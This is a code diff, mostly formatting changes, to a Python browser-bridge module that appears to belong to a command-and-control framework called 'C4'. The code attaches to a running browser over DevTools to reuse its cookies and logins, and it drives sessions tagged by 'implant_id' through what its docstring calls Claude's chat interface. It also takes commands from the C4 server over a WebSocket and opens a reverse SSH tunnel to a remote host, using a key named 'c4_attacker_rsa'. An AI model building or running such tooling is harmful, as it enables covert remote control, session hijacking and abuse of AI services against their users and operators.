@@ -114,7 +114,11 @@ class LocalBrowserBridge:
 
         if self.cdp_url:
             # Connect to existing browser instance via CDP (Chrome DevTools Protocol)
-            log.info("[cyan]Connecting to existing browser at %s[/]", self.cdp_url, extra={"markup": True})
+            log.info(
+                "[cyan]Connecting to existing browser at %s[/]",
+                self.cdp_url,
+                extra={"markup": True},
+            )
 
             # First, verify the DevTools server is actually responding
             browser_type = "unknown"
@@ -124,21 +128,41 @@ class LocalBrowserBridge:
                 with urllib.request.urlopen(version_url, timeout=5) as resp:
                     version_info = json.loads(resp.read())
                     browser_str = version_info.get("Browser", "unknown")
-                    log.info("[green]DevTools responding: %s[/]", browser_str, extra={"markup": True})
+                    log.info(
+                        "[green]DevTools responding: %s[/]",
+                        browser_str,
+                        extra={"markup": True},
+                    )
                     # Detect browser type from version string
                     if "Firefox" in browser_str:
                         browser_type = "firefox"
                     else:
                         browser_type = "chrome"
             except urllib.error.URLError as e:
-                log.error("[red]Cannot reach DevTools at %s[/]", self.cdp_url, extra={"markup": True})
+                log.error(
+                    "[red]Cannot reach DevTools at %s[/]",
+                    self.cdp_url,
+                    extra={"markup": True},
+                )
                 log.error("[red]Error: %s[/]", e.reason, extra={"markup": True})
                 log.error("")
-                log.error("[yellow]Browser is not running with remote debugging enabled.[/]", extra={"markup": True})
+                log.error(
+                    "[yellow]Browser is not running with remote debugging enabled.[/]",
+                    extra={"markup": True},
+                )
                 log.error("[yellow]To fix this:[/]", extra={"markup": True})
-                log.error("[yellow]  1. Quit ALL browser instances (check Activity Monitor)[/]", extra={"markup": True})
-                log.error("[yellow]  2. Start browser with: --remote-debugging-port=9222[/]", extra={"markup": True})
-                log.error("[yellow]  3. Or use: ./start_chrome_debug.sh or ./start_firefox_debug.sh[/]", extra={"markup": True})
+                log.error(
+                    "[yellow]  1. Quit ALL browser instances (check Activity Monitor)[/]",
+                    extra={"markup": True},
+                )
+                log.error(
+                    "[yellow]  2. Start browser with: --remote-debugging-port=9222[/]",
+                    extra={"markup": True},
+                )
+                log.error(
+                    "[yellow]  3. Or use: ./start_chrome_debug.sh or ./start_firefox_debug.sh[/]",
+                    extra={"markup": True},
+                )
                 raise RuntimeError(f"DevTools not responding at {self.cdp_url}") from e
 
             try:
@@ -157,22 +181,38 @@ class LocalBrowserBridge:
                     browser_name = "Firefox"
                 else:
                     # Chrome uses CDP
-                    self._browser = await self._playwright.chromium.connect_over_cdp(self.cdp_url)
+                    self._browser = await self._playwright.chromium.connect_over_cdp(
+                        self.cdp_url
+                    )
                     browser_name = "Chrome"
 
                 # Use the default context (has existing cookies/auth)
                 contexts = self._browser.contexts
                 if contexts:
                     self._context = contexts[0]
-                    log.info("[green]Connected to existing %s (found %d contexts)[/]", browser_name, len(contexts), extra={"markup": True})
+                    log.info(
+                        "[green]Connected to existing %s (found %d contexts)[/]",
+                        browser_name,
+                        len(contexts),
+                        extra={"markup": True},
+                    )
                 else:
                     # Create new context if none exist
                     self._context = await self._browser.new_context()
-                    log.info("[yellow]Connected to %s but no contexts found, created new one[/]", browser_name, extra={"markup": True})
+                    log.info(
+                        "[yellow]Connected to %s but no contexts found, created new one[/]",
+                        browser_name,
+                        extra={"markup": True},
+                    )
             except Exception as e:
-                log.error("[red]Failed to connect via CDP: %s[/]", e, extra={"markup": True})
+                log.error(
+                    "[red]Failed to connect via CDP: %s[/]", e, extra={"markup": True}
+                )
                 if browser_type == "firefox":
-                    log.error("[yellow]Note: Firefox CDP support is limited. Chrome may work better.[/]", extra={"markup": True})
+                    log.error(
+                        "[yellow]Note: Firefox CDP support is limited. Chrome may work better.[/]",
+                        extra={"markup": True},
+                    )
                 raise
 
         elif self.chrome_profile:
@@ -183,18 +223,26 @@ class LocalBrowserBridge:
                 headless=self.headless,
                 channel="chrome",
             )
-            log.info("[green]Browser started with persistent profile[/]", extra={"markup": True})
+            log.info(
+                "[green]Browser started with persistent profile[/]",
+                extra={"markup": True},
+            )
 
         else:
             # Fresh browser - will need to login manually
             log.info("Starting fresh Playwright browser (headless=%s)", self.headless)
-            log.warning("[yellow]No Chrome profile or CDP specified - sessions may require login[/]", extra={"markup": True})
+            log.warning(
+                "[yellow]No Chrome profile or CDP specified - sessions may require login[/]",
+                extra={"markup": True},
+            )
             browser = await self._playwright.chromium.launch(
                 headless=self.headless,
                 channel="chrome",
             )
             self._context = await browser.new_context()
-            log.info("[green]Browser started (fresh context)[/]", extra={"markup": True})
+            log.info(
+                "[green]Browser started (fresh context)[/]", extra={"markup": True}
+            )
 
     async def stop(self) -> None:
         """Clean up browser resources."""
@@ -217,13 +265,23 @@ class LocalBrowserBridge:
             if session.page and not session.page.is_closed():
                 session.status = "ready"
                 session.last_activity = datetime.now()
-                log.info("[yellow]Session %s already open, reusing[/]", implant_id[:12], extra={"markup": True})
+                log.info(
+                    "[yellow]Session %s already open, reusing[/]",
+                    implant_id[:12],
+                    extra={"markup": True},
+                )
                 return {"status": "ok", "data": "session reused"}
 
-        log.info("[cyan]Opening session for %s[/]", implant_id[:12], extra={"markup": True})
-        log.info("  URL: %s", bridge_url[:80] + "..." if len(bridge_url) > 80 else bridge_url)
+        log.info(
+            "[cyan]Opening session for %s[/]", implant_id[:12], extra={"markup": True}
+        )
+        log.info(
+            "  URL: %s", bridge_url[:80] + "..." if len(bridge_url) > 80 else bridge_url
+        )
 
-        session = BrowserSession(implant_id=implant_id, bridge_url=bridge_url, status="connecting")
+        session = BrowserSession(
+            implant_id=implant_id, bridge_url=bridge_url, status="connecting"
+        )
         self._sessions[implant_id] = session
 
         try:
@@ -240,7 +298,9 @@ class LocalBrowserBridge:
 
             session.status = "ready"
             session.last_activity = datetime.now()
-            log.info("[green]Session %s ready[/]", implant_id[:12], extra={"markup": True})
+            log.info(
+                "[green]Session %s ready[/]", implant_id[:12], extra={"markup": True}
+            )
             return {"status": "ok", "data": "session opened"}
 
         except PlaywrightTimeout:
@@ -248,13 +308,25 @@ class LocalBrowserBridge:
             screenshot_path = f"/tmp/bridge_debug_{implant_id[:8]}.png"
             if session.page:
                 await session.page.screenshot(path=screenshot_path)
-            log.error("[red]Timeout waiting for input on %s[/]", implant_id[:12], extra={"markup": True})
+            log.error(
+                "[red]Timeout waiting for input on %s[/]",
+                implant_id[:12],
+                extra={"markup": True},
+            )
             log.error("  Screenshot: %s", screenshot_path)
-            return {"status": "error", "error": f"timeout waiting for input, screenshot at {screenshot_path}"}
+            return {
+                "status": "error",
+                "error": f"timeout waiting for input, screenshot at {screenshot_path}",
+            }
 
         except Exception as e:
             session.status = "error"
-            log.error("[red]Failed to open session %s: %s[/]", implant_id[:12], e, extra={"markup": True})
+            log.error(
+                "[red]Failed to open session %s: %s[/]",
+                implant_id[:12],
+                e,
+                extra={"markup": True},
+            )
             return {"status": "error", "error": str(e)}
 
     async def send_message(self, implant_id: str, text: str) -> dict[str, Any]:
@@ -295,15 +367,27 @@ class LocalBrowserBridge:
                 await input_el.press("Enter")
 
             session.status = "sent"
-            log.info("[green]Sent to %s[/] (%d chars)", implant_id[:12], len(text), extra={"markup": True})
+            log.info(
+                "[green]Sent to %s[/] (%d chars)",
+                implant_id[:12],
+                len(text),
+                extra={"markup": True},
+            )
             return {"status": "ok", "data": None}
 
         except Exception as e:
             session.status = "error"
-            log.error("[red]Send failed for %s: %s[/]", implant_id[:12], e, extra={"markup": True})
+            log.error(
+                "[red]Send failed for %s: %s[/]",
+                implant_id[:12],
+                e,
+                extra={"markup": True},
+            )
             return {"status": "error", "error": str(e)}
 
-    async def wait_response(self, implant_id: str, timeout: float = 120.0) -> dict[str, Any]:
+    async def wait_response(
+        self, implant_id: str, timeout: float = 120.0
+    ) -> dict[str, Any]:
         """Wait for Claude's response and return the text.
 
         Waits for verification_record pattern to appear (signals completion),
@@ -319,7 +403,11 @@ class LocalBrowserBridge:
         session.status = "waiting_response"
         session.last_activity = datetime.now()
 
-        log.info("[yellow]Waiting for response from %s...[/]", implant_id[:12], extra={"markup": True})
+        log.info(
+            "[yellow]Waiting for response from %s...[/]",
+            implant_id[:12],
+            extra={"markup": True},
+        )
 
         # Regex to find verification_record with base64 content
         record_pattern = re.compile(r'verification_record["\s:]+([A-Za-z0-9+/=]{50,})')
@@ -327,9 +415,9 @@ class LocalBrowserBridge:
         try:
             # Wait for processing to start
             try:
-                await page.locator(f"{INTERRUPT_SELECTOR}, {SPINNER_SELECTOR}").first.wait_for(
-                    state="visible", timeout=10000
-                )
+                await page.locator(
+                    f"{INTERRUPT_SELECTOR}, {SPINNER_SELECTOR}"
+                ).first.wait_for(state="visible", timeout=10000)
             except PlaywrightTimeout:
                 pass  # May have already started/finished
 
@@ -341,13 +429,17 @@ class LocalBrowserBridge:
                 await asyncio.sleep(poll_interval)
                 elapsed += poll_interval
 
-                current_text = await self._get_last_response_text(page, baseline=baseline)
+                current_text = await self._get_last_response_text(
+                    page, baseline=baseline
+                )
 
                 # Check if we found the verification_record - that's our signal
                 if record_pattern.search(current_text):
                     # Give it one more poll to make sure we got everything
                     await asyncio.sleep(0.5)
-                    final_text = await self._get_last_response_text(page, baseline=baseline)
+                    final_text = await self._get_last_response_text(
+                        page, baseline=baseline
+                    )
                     session.status = "ready"
                     session.last_activity = datetime.now()
                     log.info(
@@ -358,17 +450,31 @@ class LocalBrowserBridge:
                     )
                     return {"status": "ok", "data": final_text}
 
-                log.debug("  elapsed=%.0fs, chars=%d, waiting for verification_record...", elapsed, len(current_text))
+                log.debug(
+                    "  elapsed=%.0fs, chars=%d, waiting for verification_record...",
+                    elapsed,
+                    len(current_text),
+                )
 
             # Timeout - return whatever we have
             session.status = "timeout"
             final_text = await self._get_last_response_text(page, baseline=baseline)
-            log.warning("[red]Response timeout from %s[/] (%d chars)", implant_id[:12], len(final_text), extra={"markup": True})
+            log.warning(
+                "[red]Response timeout from %s[/] (%d chars)",
+                implant_id[:12],
+                len(final_text),
+                extra={"markup": True},
+            )
             return {"status": "ok", "data": final_text}
 
         except Exception as e:
             session.status = "error"
-            log.error("[red]Wait failed for %s: %s[/]", implant_id[:12], e, extra={"markup": True})
+            log.error(
+                "[red]Wait failed for %s: %s[/]",
+                implant_id[:12],
+                e,
+                extra={"markup": True},
+            )
             return {"status": "error", "error": str(e)}
 
     async def poll_response(self, implant_id: str) -> dict[str, Any]:
@@ -443,7 +549,12 @@ class LocalBrowserBridge:
         if count == 0:
             return ""
 
-        log.debug("Extracting messages: baseline=%d, count=%d, new=%d", baseline, count, count - baseline)
+        log.debug(
+            "Extracting messages: baseline=%d, count=%d, new=%d",
+            baseline,
+            count,
+            count - baseline,
+        )
 
         # Collect all assistant messages after baseline (in order)
         assistant_texts: list[str] = []
@@ -457,7 +568,7 @@ class LocalBrowserBridge:
             text = (await msg.inner_text()).strip()
             if text:
                 # Log first 50 chars of each message for debugging
-                preview = text[:50].replace('\n', ' ')
+                preview = text[:50].replace("\n", " ")
                 log.debug("  [%d] assistant: %s...", i, preview)
                 assistant_texts.append(text)
 
@@ -484,7 +595,9 @@ class LocalBrowserBridge:
 class BridgeServer:
     """WebSocket server that accepts commands from C4 server."""
 
-    def __init__(self, bridge: LocalBrowserBridge, host: str = "localhost", port: int = 8888) -> None:
+    def __init__(
+        self, bridge: LocalBrowserBridge, host: str = "localhost", port: int = 8888
+    ) -> None:
         self.bridge = bridge
         self.host = host
         self.port = port
@@ -525,10 +638,14 @@ class BridgeServer:
                     response = await self._dispatch(request)
                     await websocket.send(json.dumps(response))
                 except json.JSONDecodeError as e:
-                    await websocket.send(json.dumps({"status": "error", "error": f"invalid JSON: {e}"}))
+                    await websocket.send(
+                        json.dumps({"status": "error", "error": f"invalid JSON: {e}"})
+                    )
                 except Exception as e:
                     log.exception("Error handling request")
-                    await websocket.send(json.dumps({"status": "error", "error": str(e)}))
+                    await websocket.send(
+                        json.dumps({"status": "error", "error": str(e)})
+                    )
         finally:
             self._connections.discard(websocket)
             log.info("[yellow]C4 server disconnected[/]", extra={"markup": True})
@@ -592,10 +709,14 @@ async def start_ssh_tunnel(
         ssh_path,
         "-N",  # No remote command
         "-T",  # Disable pseudo-terminal
-        "-o", "ExitOnForwardFailure=yes",
-        "-o", "ServerAliveInterval=30",
-        "-o", "ServerAliveCountMax=3",
-        "-R", f"{remote_port}:localhost:{local_port}",
+        "-o",
+        "ExitOnForwardFailure=yes",
+        "-o",
+        "ServerAliveInterval=30",
+        "-o",
+        "ServerAliveCountMax=3",
+        "-R",
+        f"{remote_port}:localhost:{local_port}",
     ]
 
     if ssh_key:
@@ -603,7 +724,9 @@ async def start_ssh_tunnel(
 
     cmd.append(f"{ssh_user}@{remote_host}")
 
-    log.info("[cyan]Starting SSH tunnel to %s...[/]", remote_host, extra={"markup": True})
+    log.info(
+        "[cyan]Starting SSH tunnel to %s...[/]", remote_host, extra={"markup": True}
+    )
     log.info("  Command: %s", " ".join(cmd))
 
     try:
@@ -618,7 +741,9 @@ async def start_ssh_tunnel(
         if proc.poll() is not None:
             # Process exited - tunnel failed
             stderr = proc.stderr.read().decode() if proc.stderr else ""
-            log.error("[red]SSH tunnel failed: %s[/]", stderr.strip(), extra={"markup": True})
+            log.error(
+                "[red]SSH tunnel failed: %s[/]", stderr.strip(), extra={"markup": True}
+            )
             return None
 
         log.info("[green]SSH tunnel established[/]", extra={"markup": True})
@@ -638,7 +763,9 @@ async def main() -> None:
     parser = argparse.ArgumentParser(description="Local Browser Bridge Service")
     parser.add_argument("--port", type=int, default=8888, help="WebSocket server port")
     parser.add_argument("--host", default="localhost", help="WebSocket server host")
-    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
+    parser.add_argument(
+        "--headless", action="store_true", help="Run browser in headless mode"
+    )
     parser.add_argument(
         "--chrome-profile",
         default=None,
@@ -665,7 +792,8 @@ async def main() -> None:
         help="Path to SSH private key for tunnel (e.g. ~/.ssh/c4_attacker_rsa)",
     )
     parser.add_argument(
-        "-v", "--verbose",
+        "-v",
+        "--verbose",
         action="store_true",
         help="Enable debug logging",
     )
@@ -682,7 +810,11 @@ async def main() -> None:
     else:
         browser_info = "[yellow]Fresh browser - may need login[/]"
 
-    tunnel_info = f"Tunnel: {args.tunnel_to}" if args.tunnel_to else "[dim]No tunnel (manual SSH required)[/]"
+    tunnel_info = (
+        f"Tunnel: {args.tunnel_to}"
+        if args.tunnel_to
+        else "[dim]No tunnel (manual SSH required)[/]"
+    )
 
     console.print(
         Panel(
@@ -727,7 +859,9 @@ async def main() -> None:
             ssh_user=ssh_user,
         )
         if not ssh_proc:
-            console.print("[red]Failed to establish SSH tunnel. Continuing without tunnel...[/]")
+            console.print(
+                "[red]Failed to establish SSH tunnel. Continuing without tunnel...[/]"
+            )
 
     # Create bridge with appropriate mode
     cdp_url = args.cdp_url if args.connect_existing else None
